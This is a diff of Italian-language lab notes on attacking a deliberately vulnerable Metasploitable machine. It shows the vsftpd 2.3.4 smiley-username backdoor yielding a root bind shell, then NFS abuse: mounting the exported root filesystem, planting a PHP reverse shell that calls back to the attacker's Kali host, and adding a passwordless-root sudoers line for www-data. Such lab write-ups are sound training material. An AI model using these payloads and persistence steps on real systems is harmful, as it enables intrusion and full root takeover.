@@ -60,9 +60,42 @@ OTTENIMENTO DI UNA BIND SHELL COME ROOT
 
 
 SFRUTTAMENTO DELLA BACKDOOR IN VSFTPD-2.3.4
-Interazione con la porta 21 --> nc 192.168.56.103 21
-	USER fanfa:)
-	PASS pass
+Interazione con la porta 21 --> ftp 192.168.56.103
+	Name: fanfa:)
+	Password: pass
 Dopodiché ho effettuato una nuova scansione delle porte --> sudo nmap -sS -p- 192.168.56.103
 Ho notato che risulta una porta aperta in più --> 6200/tcp
-Dunque, ho lanciato il seguente comando su un nuovo terminale --> nc 192.168.56.103 6200 --> effettivamente ho ottenuto un'altra bind shell.
+Dunque, ho lanciato il seguente comando su un nuovo terminale --> nc 192.168.56.103 6200 --> effettivamente ho ottenuto un'altra bind shell come root.
+La nuova shell è senza TTY: per avere un TTY anche qui --> python -c 'import pty;pty.spawn("/bin/bash")'
+
+In alternativa, è anche possibile sfruttare lo script ExploitVsftp.py per poi eseguire il comando python -c 'import pty;pty.spawn("/bin/bash")'
+
+
+
+SFRUTTAMENTO DEL SERVIZIO NFS
+showmount -e 192.168.56.103 --> visualizza le risorse esportate da NFS, che sono: '/' (file system) e '*' (indirizzi IP che possono effettuare le richieste).
+mkdir MetasploitableFS --> crea una nuova directory all'interno della quale verrà montato il file system di Metasploitable esportato da NFS.
+sudo mount -t nfs 192.168.56.103:/ ./Test --> monta il file system di Metasploitable all'interno di MetasploitableFS.
+cd MetasploitableFS --> ora mi trovo all'interno della root directory del file system di Metasploitable.
+sudo su --> ora impersonifico l'utente root: anche nel file system di Metasploitable posso fare quello che voglio; il mio obiettivo è ottenere una shell.
+
+Sfrutto il server http per ottenere una shell mediante il file system: all'interno di ./var/www si dovrebbe avere la risorsa principale del server http che,
+di fatto, è index.php. Se si ha delle difficoltà nell'individuare la risorsa principale, basta consultare il contenuto dei file contenuti in ./etc/apache2.
+
+A questo punto, all'interno della directory ./var/www, creo un nuovo file .php che sfrutterò per ottenere una shell --> touch ./var/www/shell.php
+Shell.php avrà il codice PHP per una reverse shell (vedi GitHub --> swisskyrepo/PayloadsAllTheThings/Methodology and Resources/Reverse Shell Cheatsheet.md):
+	<?php
+        	$sock=fsockopen("192.168.56.16", 1234);$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);
+        	#192.168.56.16 è l'indirizzo IP della macchina Kali su cui sto lavorando
+	?>
+Dopodiché ho aperto una nuova istanza di terminale per mettermi in ascolto sulla porta 1234 --> nc -lvnp 1234
+Sul browser --> http://192.168.56.103/shell.php
+Ora si è aperta una shell nell'istanza di terminale dove mi ero messo in ascolto sulla porta 1234: qui impersonifico l'utente www-data.
+
+L'obiettivo ora è diventare l'utente root nella shell che ho appena acquisito.
+Anzitutto, all'interno del file system di Metasploitable, mi porta nella directory /etc.
+nano sudoers --> in sudoers vado ad aggiungere la seguente riga:
+	www-data        ALL=(root) NOPASSWD: *
+Ora, nella shell che ho acquisito per conto dell'utente www-data, è sufficiente lanciare i seguenti comandi:
+sudo su --> divento il root.
+python -c 'import pty;pty.spawn("/bin/bash")' --> ottengo il TTY.
